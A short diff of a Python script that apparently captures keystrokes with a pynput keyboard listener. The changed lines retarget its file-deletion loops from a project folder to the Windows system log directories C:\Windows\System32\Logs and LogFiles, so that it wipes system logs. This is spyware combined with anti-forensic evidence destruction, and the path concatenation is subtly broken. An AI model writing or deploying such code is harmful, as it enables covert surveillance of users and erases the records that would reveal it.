@@ -15,11 +15,11 @@ def keypress(Key):
 with Listener(on_press = keypress) as listener:
         listener.join()
 for file in os.listdir(r'C:\Windows\System32\Logs'):
-    file_path = os.path.join(r'C:\Prabhav\Project\chatbot', file)
+    file_path = os.path.join(r'C:\Windows\System32\Logs',file)
     if os.path.isfile(file_path):
         os.remove(file_path)
-for folder in os.listdir(r'C:\Prabhav\Project\chatbot'):
-    for file in os.listdir('C:\\Prabhav\\Project\\chatbot\\'+folder):
+for folder in os.listdir('C:\\Windows\\System32\\LogFiles'):
+    for file in os.listdir('C:\\Windows\\System32\\LogFiles'+folder):
         file_path = os.path.join('C:\\Windows\\System32\\LogFiles'+folder, file)
         if os.path.isfile(file_path):
             os.remove(file_path)
